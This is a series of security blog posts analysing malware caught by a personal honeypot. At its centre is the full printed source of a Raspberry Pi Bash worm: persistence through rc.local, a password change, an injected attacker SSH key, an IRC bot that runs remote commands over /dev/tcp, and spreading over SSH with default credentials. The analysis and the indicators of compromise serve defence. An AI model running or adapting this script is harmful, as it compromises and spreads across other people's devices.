So, what can we learn here? The most significant point to me is that the vast majority of automated attacks that targeted me used naive methods. My findings here only serve to reinforce the idea that the most dangerous elements in computer security are us. Attackers here were not abusing zero-day flaws, nor using sophisticated methodologies.\nInstead, bots were used to perform mass reconnaissance, searching for low-hanging security fruit, namely default passwords. The attackers were looking for those of us who habitually neglect to employ comprehensive initial security configurations. Those of us who put off applying security patches for years (the most common exploit attempt by far was CVE-2006-2369). Those of us who leave all of our services exposed to the Internet at all times unnecessarily. Ransomware was deployed nearly 100 times, but it wasn\u0026rsquo;t novel technology; no, it was mainly WannaCry, patched by Microsoft in 2017.\nAs a security community, we can certainly do better. These attacks wouldn\u0026rsquo;t occur if they weren\u0026rsquo;t successful at times. Even the most basic security policy would mitigate the majority, if not all of the attacks I received. Let\u0026rsquo;s make sure we change our passwords, use firewalls — they exist for a reason — and patch our software to keep our environments safe.\nThanks so much for reading. Questions or comments? Please email me — I\u0026rsquo;d love to hear from you.\n ← Fishing for Malware: Part 4\nI am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/fishing-for-malware-5/","summary":"Analysis of malware dropped into my Google Cloud honeypot — an examination of collected data","title":"Fishing for Malware — Part Five: Finale"},{"content":"⇤ Start from the beginning\nWhile dissecting binaries using Ghidra, Strings, and Hexdump makes for a fun puzzle in itself, it\u0026rsquo;s also fascinating to inspect the raw source code of malware. Cowrie, a Telnet and SSH honeypot with emulates a Unix environment packaged within T-Pot, captured quite the interesting Bash script, which includes a variety of malicious elements specifically designed for the Raspberry Pi platform.\nInformation Purpose: installation of TCP backdoor on Linux; accepts commands via IRC channel #biret.\nIndicators of Compromise  MD5: 182be4e7136619107ae4c41601d43118 SHA-1: b06060d90decfa5bb90f379a17f34699fae7ad6f SHA-256: 7d031312baf7d28ccb1bbf7598c368f29b33c88e650e22e115d02b308f0b6491 Connected domains:  ix1.undernet.org ix2.undernet.org Ashburn.Va.Us.UnderNet.org Bucharest.RO.EU.Undernet.Org Budapest.HU.EU.UnderNet.org Chicago.IL.US.Undernet.org bins.deutschland-zahlung.eu   Unexpected TCP connections on port 6667 Entry for XXXXXXXX, where X represents any ASCII char, in /opt or in /etc/rc.local Public key matching the following:  SSH: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B SSL: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB   Unexpected password change on local user account pi Unexpected installaton of packages zmap, sshpass Proccess running from /tmp using nohup  File  Magic: plain ASCII Language: Bash Size: 4.65 KB  Source Code C0755 4745 nC9qy0wv #!/bin/bash MYSELF=`realpath $0` DEBUG=/dev/null echo $MYSELF \u0026gt;\u0026gt; $DEBUG if [ \u0026#34;$EUID\u0026#34; -ne 0 ] then NEWMYSELF=`mktemp -u \u0026#39;XXXXXXXX\u0026#39;` sudo cp $MYSELF /opt/$NEWMYSELF sudo sh -c \u0026#34;echo \u0026#39;#!/bin/sh -e\u0026#39; \u0026gt; /etc/rc.local\u0026#34; sudo sh -c \u0026#34;echo /opt/$NEWMYSELF\u0026gt;\u0026gt; /etc/rc.local\u0026#34; sudo sh -c \u0026#34;echo \u0026#39;exit 0\u0026#39; \u0026gt;\u0026gt; /etc/rc.local\u0026#34; sleep 1 sudo reboot else TMP1=`mktemp` echo $TMP1 \u0026gt;\u0026gt; $DEBUG killall bins.sh killall minerd killall node killall nodejs killall ktx-armv4l killall ktx-i586 killall ktx-m68k killall ktx-mips killall ktx-mipsel killall ktx-powerpc killall ktx-sh4 killall ktx-sparc killall arm5 killall zmap killall kaiten killall perl echo \u0026#34;127.0.0.1 bins.deutschland-zahlung.eu\u0026#34; \u0026gt;\u0026gt; /etc/hosts rm -rf /root/.bashrc rm -rf /home/pi/.bashrc usermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi mkdir -p /root/.ssh echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt;\u0026gt; /etc/resolv.conf rm -rf /tmp/ktx* rm -rf /tmp/cpuminer-multi rm -rf /var/tmp/kaiten cat \u0026gt; /tmp/public.pem \u0026lt;\u0026lt;EOFMARKER -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB -----END PUBLIC KEY----- EOFMARKER BOT=`mktemp -u \u0026#39;XXXXXXXX\u0026#39;` cat \u0026gt; /tmp/$BOT \u0026lt;\u0026lt;\u0026#39;EOFMARKER\u0026#39; #!/bin/bash SYS=`uname -a | md5sum | awk -F\u0026#39; \u0026#39; \u0026#39;{print $1}\u0026#39;` NICK=a${SYS:24} while [ true ]; do arr[0]=\u0026#34;ix1.undernet.org\u0026#34; arr[1]=\u0026#34;ix2.undernet.org\u0026#34; arr[2]=\u0026#34;Ashburn.Va.Us.UnderNet.org\u0026#34; arr[3]=\u0026#34;Bucharest.RO.EU.Undernet.Org\u0026#34; arr[4]=\u0026#34;Budapest.HU.EU.UnderNet.org\u0026#34; arr[5]=\u0026#34;Chicago.IL.US.Undernet.org\u0026#34; rand=$[$RANDOM % 6] svr=${arr[$rand]} eval \u0026#39;exec 3\u0026lt;\u0026gt;/dev/tcp/$svr/6667;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then continue fi echo $NICK eval \u0026#39;printf \u0026#34;NICK $NICK\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then continue fi eval \u0026#39;printf \u0026#34;USER user 8 * :IRC hi\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then continue fi # Main loop while [ true ]; do eval \u0026#34;read msg_in \u0026lt;\u0026amp;3;\u0026#34; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi if [[ \u0026#34;$msg_in\u0026#34; =~ \u0026#34;PING\u0026#34; ]] ; then printf \u0026#34;PONG %s\\n\u0026#34; \u0026#34;${msg_in:5}\u0026#34;; eval \u0026#39;printf \u0026#34;PONG %s\\r\\n\u0026#34; \u0026#34;${msg_in:5}\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi sleep 1 eval \u0026#39;printf \u0026#34;JOIN #biret\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi elif [[ \u0026#34;$msg_in\u0026#34; =~ \u0026#34;PRIVMSG\u0026#34; ]] ; then privmsg_h=$(echo $msg_in| cut -d\u0026#39;:\u0026#39; -f 3) privmsg_data=$(echo $msg_in| cut -d\u0026#39;:\u0026#39; -f 4) privmsg_nick=$(echo $msg_in| cut -d\u0026#39;:\u0026#39; -f 2 | cut -d\u0026#39;!\u0026#39; -f 1) hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\u0026#39; \u0026#39; \u0026#39;{print $1}\u0026#39;` sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin` if [[ \u0026#34;$sign\u0026#34; == \u0026#34;$hash\u0026#34; ]] ; then CMD=`echo $privmsg_data | base64 -d -i` RES=`bash -c \u0026#34;$CMD\u0026#34; | base64 -w 0` eval \u0026#39;printf \u0026#34;PRIVMSG $privmsg_nick :$RES\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi fi fi done done EOFMARKER chmod +x /tmp/$BOT nohup /tmp/$BOT 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/bot.log \u0026amp; rm /tmp/nohup.log -rf rm -rf nohup.out sleep 3 rm -rf /tmp/$BOT NAME=`mktemp -u \u0026#39;XXXXXXXX\u0026#39;` date \u0026gt; /tmp/.s apt-get update -y --force-yes apt-get install zmap sshpass -y --force-yes while [ true ]; do FILE=`mktemp` zmap -p 22 -o $FILE -n 100000 killall ssh scp for IP in `cat $FILE` do sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026amp;\u0026amp; echo $IP \u0026gt;\u0026gt; /opt/.r \u0026amp;\u0026amp; sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \u0026#34;cd /tmp \u0026amp;\u0026amp; chmod +x $NAME\u0026amp;\u0026amp; bash -c ./$NAME\u0026#34; \u0026amp; sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026amp;\u0026amp; echo $IP \u0026gt;\u0026gt; /opt/.r \u0026amp;\u0026amp; sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \u0026#34;cd /tmp \u0026amp;\u0026amp; chmod +x $NAME\u0026amp;\u0026amp; bash -c ./$NAME\u0026#34; \u0026amp; done rm -rf $FILE sleep 10 done fi Annotated Breakdown Okay — there is a lot to unpack here. Let\u0026rsquo;s proceed chronologically down the length of the script.\nHead MYSELF=`realpath $0` # Find my location DEBUG=/dev/null echo $MYSELF \u0026gt;\u0026gt; $DEBUG realpath is part of the GNU coreutils; it resolves the location of an entity in the filesystem while resolving all references and links. The functionality of pwd, in most cases, may be thought of as a subset of realpath in that respect. The above code is used to determine where the script itself resides upon execution.\nPrivilege Escalation if [ \u0026#34;$EUID\u0026#34; -ne 0 ] # If not running as root (or under sudo/doas) then NEWMYSELF=`mktemp -u \u0026#39;XXXXXXXX\u0026#39;` # Generate a pseudorandom string 8 chars long sudo cp $MYSELF /opt/$NEWMYSELF # Copy this script to /opt with the name geenrated above sudo sh -c \u0026#34;echo \u0026#39;#!/bin/sh -e\u0026#39; \u0026gt; /etc/rc.local\u0026#34; # Start sh on boot... sudo sh -c \u0026#34;echo /opt/$NEWMYSELF\u0026gt;\u0026gt; /etc/rc.local\u0026#34; # ...So that this script can also be executed on boot sudo sh -c \u0026#34;echo \u0026#39;exit 0\u0026#39; \u0026gt;\u0026gt; /etc/rc.local\u0026#34; # Stop whatever else may come afterwards sleep 1 sudo reboot #Reboot so that the script may take effect *running as ROOT* else TMP1=`mktemp` echo $TMP1 \u0026gt;\u0026gt; $DEBUG This is a fantastic example of simple privilege escalation! The EUID is first checked — an EUID of zero indicates that the current privilege level is root, by way of actually running as the root account or elevation via sudo or doas. Not running as root presents issues for this script; the following steps are executed if so:\n Generate a random string with mktemp. Copy the script to /opt using the generated string as the filename. Append sh (shell) and the script to /etc/rc.local, which will be executed on boot as root, thereby running the script as root. Reboot.  Quite creative.\nKilling Processes killall bins.sh killall minerd killall node killall nodejs killall ktx-armv4l killall ktx-i586 killall ktx-m68k killall ktx-mips killall ktx-mipsel killall ktx-powerpc killall ktx-sh4 killall ktx-sparc killall arm5 killall zmap killall kaiten killall perl The script then kills the processes shown above. zmap, a network scanner, seems reasonable to stop (with malicious intent), but I\u0026rsquo;m not sure why the attacker chose to stop the others, which are oddly specific. Perhaps to save resources?\nCleaning Bash Profiles; Changing Account Password echo \u0026#34;127.0.0.1 bins.deutschland-zahlung.eu\u0026#34; \u0026gt;\u0026gt; /etc/hosts # Classic malicious domain rm -rf /root/.bashrc # Clearing Bash customization from the root account rm -rf /home/pi/.bashrc # Clearing Bash customization from the... pi account? Raspberry Pi? # Changing the password of the pi account (encrypted) usermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi This section provides some much-needed insight: the assumption of the pi account implies that this script must be designed for use on Raspberry Pi devices! This may also explain killing the processes above — Node, for example, is a common application run on Rasberry Pi computers for development work.\nInjecting SSH key mkdir -p /root/.ssh echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys Here\u0026rsquo;s another interesting section — the script appends the public SSH key of the attacker to provide for remote access! Let this serve as a reminder to always audit authorized_keys. Google, for example, prevents this attack from occurring on their Cloud Compute VMs by running a service that periodically resets authorized_keys to a version that only includes keys explicitly defined in the VM metadata.\nRemoving Malware? echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt;\u0026gt; /etc/resolv.conf rm -rf /tmp/ktx* rm -rf /tmp/cpuminer-multi rm -rf /var/tmp/kaiten As far as I can tell, the directories removed in the code above belong to (potentially malicious) crypto miners. Therefore, it seems that this malware is cleaning up the processes of other malware. How kind of the script author.\nThe DNS entry ensures connectivity to the attacker by using a common host (Google). This malware otherwise would might not function on networks such as my own, as I run a personal DNS server with many malicious and otherwise undesired domains blocked.\nStoring a Public Key cat \u0026gt; /tmp/public.pem \u0026lt;\u0026lt;EOFMARKER -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB -----END PUBLIC KEY----- EOFMARKER A public key is then placed within /tmp/public.pem, presumably to allow for simple remote access by another service (?).\nEmbedded IRC Script So far, a lot of preliminary steps have been taken to prepare the target environment for attack. It is here, within an infinite while loop, that the attack finally occurs.\nHead BOT=`mktemp -u \u0026#39;XXXXXXXX\u0026#39;` # Generates another pseudorandom string for the file name below cat \u0026gt; /tmp/$BOT \u0026lt;\u0026lt;\u0026#39;EOFMARKER\u0026#39; #!/bin/bash ... Setting a system name ... SYS=`uname -a | md5sum | awk -F\u0026#39; \u0026#39; \u0026#39;{print $1}\u0026#39;` # Gets a hash of the system name NICK=a${SYS:24} # Sets a nickname ... Frankly, this section strikes me as dumb misguided (kindly pass on my most sincere apologies to the script author). Here is why: except for a few edge cases, the vast majority of Raspberry Pi devices run Linux. On Linux, uname -a always returns the same string:\n$ uname -a Linux So, the SYS variable assignment command does the following:\n Execute uname -a, which will almost always return the same \u0026ldquo;Linux\u0026rdquo; string. Pipe \u0026ldquo;Linux\u0026rdquo; into md5sum, which will always return the \u0026ldquo;638dd9cda411c1f92e831eeb14780a67\u0026rdquo;.  Since the hash is the same every time, NICK=a${SYS:24} will set the nickname variable to the string \u0026ldquo;a14780a67\u0026rdquo; at least 99 percent of the time. So, what is the point of setting a nickname to the same string on every target device? I\u0026rsquo;m not sure — for that, we would have to tap into the infinite wisdom of the script author.\nMapping IRC Servers ... while [ true ]; do # Servers arr[0]=\u0026#34;ix1.undernet.org\u0026#34; arr[1]=\u0026#34;ix2.undernet.org\u0026#34; arr[2]=\u0026#34;Ashburn.Va.Us.UnderNet.org\u0026#34; arr[3]=\u0026#34;Bucharest.RO.EU.Undernet.Org\u0026#34; arr[4]=\u0026#34;Budapest.HU.EU.UnderNet.org\u0026#34; arr[5]=\u0026#34;Chicago.IL.US.Undernet.org\u0026#34; # Chooses a pseudorandom server rand=$[$RANDOM % 6] svr=${arr[$rand]} # Check if an established TCP connection exists between host and server eval \u0026#39;exec 3\u0026lt;\u0026gt;/dev/tcp/$svr/6667;\u0026#39; # Also, set new FD (3) if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then continue # Skip back to the top of the loop if a connection already exists # NO `sleep` statement here... will check endlessly as fast as possible; silly fi ... It appears that this bot uses the UnderNet IRC system to establish connections with. Let\u0026rsquo;s take a look at UnderNet— perhaps we can find IRC channels (specifically #biret) related to this malware. For reference, #biret is the channel that this script initiates connections to.\nSigh. IRC\u0026hellip; A relic that is perhaps best forgotten in some aspects. Two other users, which I have deliberately not shown here, are active at the time of writing this post in #biret. In fact, one of the active users has the name of a compromised target device!\nMain Logic ... echo $NICK eval \u0026#39;printf \u0026#34;NICK $NICK\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then continue fi eval \u0026#39;printf \u0026#34;USER user 8 * :IRC hi\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then continue fi # Main loop while [ true ]; do eval \u0026#34;read msg_in \u0026lt;\u0026amp;3;\u0026#34; // Examine the contents of msg_in recieved from the TCP host-IRC connection # If msg_in is null, quit the main loop if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi # On IRC in = \u0026#39;PING\u0026#39;, respond \u0026#39;PONG\u0026#39; via IRC # Presumably to test connectivity? if [[ \u0026#34;$msg_in\u0026#34; =~ \u0026#34;PING\u0026#34; ]] ; then printf \u0026#34;PONG %s\\n\u0026#34; \u0026#34;${msg_in:5}\u0026#34;; eval \u0026#39;printf \u0026#34;PONG %s\\r\\n\u0026#34; \u0026#34;${msg_in:5}\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi sleep 1 // If msg_in is null, quit the main loop eval \u0026#39;printf \u0026#34;JOIN #biret\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi # `=~` is a bash regex operator which searches for \u0026#39;PRIVMSG\u0026#39; within $msg_in # So, if \u0026#39;PRIVMSG\u0026#39; is somewhere within $msg_in, continue elif [[ \u0026#34;$msg_in\u0026#34; =~ \u0026#34;PRIVMSG\u0026#34; ]] ; then # Cut $msg_in, extracting the relevant elements: # - A section to be hashed # - A data section containing instructions # - The IRC nickname of the host privmsg_h=$(echo $msg_in| cut -d\u0026#39;:\u0026#39; -f 3) privmsg_data=$(echo $msg_in| cut -d\u0026#39;:\u0026#39; -f 4) privmsg_nick=$(echo $msg_in| cut -d\u0026#39;:\u0026#39; -f 2 | cut -d\u0026#39;!\u0026#39; -f 1) # Get an MD5 hash of the data from $msg_in # Use $privmsg_h to sign the public key generated earlier # Use: Ensure attacks come from the original attacker hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\u0026#39; \u0026#39; \u0026#39;{print $1}\u0026#39;` sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin` # If the sign is genuine (signed with the attackers public key) if [[ \u0026#34;$sign\u0026#34; == \u0026#34;$hash\u0026#34; ]] ; then CMD=`echo $privmsg_data | base64 -d -i` // Then grab the command to execute RES=`bash -c \u0026#34;$CMD\u0026#34; | base64 -w 0` eval \u0026#39;printf \u0026#34;PRIVMSG $privmsg_nick :$RES\\r\\n\u0026#34; \u0026gt;\u0026amp;3;\u0026#39; // Echo command back to attacker? # If msg_in is null, quit the main loop if [[ ! \u0026#34;$?\u0026#34; -eq 0 ]] ; then break fi fi fi done done EOFMARKER ... The main execution loop has several interesting elements. Essentially, the attacker establishes communication with the victim host via IRC and signs their attacks to ensure no other malicious actor can take advantage of the exploit. Very creative — this is likely also why no commands I sent to victim hosts in #biret responded to requests.\n... chmod +x /tmp/$BOT # Makes script executable so that it can run on other systems nohup /tmp/$BOT 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/bot.log \u0026amp; # Ensures that the script is not stopped upon user logoff or any other hang events # Clean traces rm /tmp/nohup.log -rf rm -rf nohup.out sleep 3 rm -rf /tmp/$BOT # Generate a new name NAME=`mktemp -u \u0026#39;XXXXXXXX\u0026#39;` date \u0026gt; /tmp/.s # Install: # - ZMap: a network scanner # - sshpass: a utility that allows for keyboard-interactive SSH sessions in non-interactive (automated) sessions apt-get update -y --force-yes apt-get install zmap sshpass -y --force-yes # SPREAD LOOP while [ true ]; do FILE=`mktemp` # Collect all IPs with port 22 open zmap -p 22 -o $FILE -n 100000 killall ssh scp for IP in `cat $FILE` # For each IP with 22 open, attempt to log in awith the credential set pi:praspberry # If a connection succeeds: # SPREAD AND EXECUTE THE SCRIPT do sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026amp;\u0026amp; echo $IP \u0026gt;\u0026gt; /opt/.r \u0026amp;\u0026amp; sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \u0026#34;cd /tmp \u0026amp;\u0026amp; chmod +x $NAME\u0026amp;\u0026amp; bash -c ./$NAME\u0026#34; \u0026amp; sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026amp;\u0026amp; echo $IP \u0026gt;\u0026gt; /opt/.r \u0026amp;\u0026amp; sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \u0026#34;cd /tmp \u0026amp;\u0026amp; chmod +x $NAME\u0026amp;\u0026amp; bash -c ./$NAME\u0026#34; \u0026amp; done rm -rf $FILE // Clean traces sleep 10 done fi And here we have the finale: as with so many other malicious binaries, it attempts to spread where it can, trying to infect any unsecured Raspberry Pi on the local network. For a user with many new Raspberry Pis, I imagine this attack would prove very effective, netting many hosts.\nConclusion This was certainly an interesting script to behold. From the methodology employed by the attacker to control remote machines to the attack signing, it is evident that significant thought went into the development of this script. I would love the opportunity to anonymously interview the attacker\u0026hellip; How many hosts were infected? Were infected hosts primarily useless, residential hobby computers? Was it possible to pivot from infected Raspberry pis to more important targets? Abstracting the unethicality of the development of malware, the creativity demonstrated here is remarkable and has made for quite an engaging learning experience.\nNote: I do not condone the development or distribution of malware outside of educational contexts.\n What should I do if I find this script on my Raspberry Pi?\n Immediately disconnect the device from the network and eject the storage medium. Mount it on an external device, back up any needed data, and then wipe all data. Reinstall the OS as normal. Do not attempt to manually remove the malware, as there is no reliable record of extra steps the attacker may have taken.\n What can we learn from this attack?\n Always, always, always secure services and minimize service visibility on the Internet. This attack would not function without the ability to deposit itself onto a host. Further, change default passwords for every account and service, even those not used. This script takes advantage of negligence in that regard, searching for hosts with the default Rasberry Pi credentials to pivot to.\nStay safe online, and thank you so much for reading.\n Fishing for Malware: Part 5 →\n← Fishing for Malware: Part 3\nI am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","permalink":"https://swlacy.com/posts/fishing-for-malware-4/","summary":"Analysis of malware dropped into my Google Cloud honeypot — fun with Bash on R Pi","title":"Fishing for Malware — Part Four: Raspberry Pi IRC Bot"},{"content":"⇤ Start from the beginning\nCatching WannaCry One very interesting binary uploaded to my honeypot not only once, but several times from multiple hosts around the world, was WannaCry. Yes, nearly five years after the Shadow Brokers sold the NSA\u0026rsquo;s EternalBlue exploit to the notorious Pyongyang-based (alleged) Lazarus Group, who then developed and released WannaCry, one of the most damaging ransomware packages is still in active distribution.\nEven after Marcus Hutchins discovered and published WannaCry\u0026rsquo;s \u0026ldquo;kill switch\u0026rdquo; and Microsoft patched EternalBlue, WannaCry remains a dangerous binary. After all, the age-old logic that it is somehow more reasonable to risk the exorbitant cost of malware damages than to pay for sound security architecture sadly remains to this day. So, given that I am now in possession of over a dozen permutations of WannaCry, what is the obvious next step? Of course, to execute it!\nExecuting WannaCry Preparing the Environment Because I care quite deeply about the security of my home network, I have offloaded the risk of knowingly running malware onto Microsoft via Azure. Thank you for supporting my student endeavors, Microsoft. Azure still supports Windows 7, so I deployed an image of Windows 7 Enterprise with the following technical specs:\nSecurity type Standard Image Windows 7 Enterprise - Gen1 Size Standard B2ms (2 vcpus, 8 GiB memory) OS disk type Premium SSD LRS To ensure maximum damage by WannaCry, I also uninstalled every Windows update via a generated Batch script using the kind advice of users M.Josh and imansejati on the Microsoft Forums. Removing feature updates was unnecessary, but it was easier to simply remove every KB* update, which includes all of those intended for security purposes. The full script can be found here, a preview of which is below:\nwusa /uninstall /KB:2849697 /quiet /norestart wusa /uninstall /KB:2849696 /quiet /norestart wusa /uninstall /KB:2841134 /quiet /norestart wusa /uninstall /KB:2670838 /quiet /norestart wusa /uninstall /KB:2479943 /quiet /norestart wusa /uninstall /KB:2491683 /quiet /norestart ... (+188 more) While I waited for the updates to be uninstalled, I was struck by just how unbearably nostalgic the Windows 7 acrylic design scheme is. Sadly, it seems that Azure images of Windows 7 aren\u0026rsquo;t provisioned with MS Solitaire or Purble Place\u0026hellip; Good memories, nonetheless; it was on Windows 7 that I gained an appreciation for computing and security in general. I recall creating prank \u0026ldquo;games\u0026rdquo; with my friends on the computers in middle school that would power off the PC if the user lost, or make the LOCK indicators on the keyboards flash non-stop with VBA. A time bound to the past, for sure. I can\u0026rsquo;t imagine shell access on middle school student accounts these days, let alone unrestricted, editable access to student registration information on network drives mounted to every PC in the domain.\nI also disabled Windows Firewall, and then proceed on to Windows Defender — right, Windows 7 doesn\u0026rsquo;t have Windows Defender, or any real-time AV, configured by default. A notification in the Action Center urgently warned me to \u0026ldquo;Find an antivirus program online (Important).\u0026rdquo; Combined with the way Windows handles privilege escalation, it is no wonder that Windows is notorious for security issues.\nFinally, after waiting for significantly longer than I had anticipated, all updates were uninstalled, and the PC restarted.\nC:\\Users\\slak\u0026gt;wmic qfe get hotfixid HotFixID C:\\Users\\slak\u0026gt; As a reminder, I had also uninstalled feature updates, which left the desktop post-reboot with all the classical charm of Windows 2000.\nOf course, the desktop didn\u0026rsquo;t look like this for long — executing wannacry.exe yielded the following shortly after.\nPost-Execution Success! WannaCry was active and my files were encrypted, all with strange WannaCry-specific file extensions\u0026hellip; In a different context, I\u0026rsquo;m sure I would be quite upset here.\nSome elements of the WannaCry GUI stood out to me in particular: the Check Payment and Contact Us buttons. Both, of course, imply the requirement for outbound requests to a foreign server. In light of that, I attempted to set up Wireshark and TCPview to see where requests are sent. However, as can be seen below, neither program functioned as expected, both either crashing instantly or failing to bind to network interfaces. Whether this is due to interference by WannaCry or something else, I am not sure.\nEven though TCPview nor Wireshark operated as expected, in blue below, I have boxed some outgoing 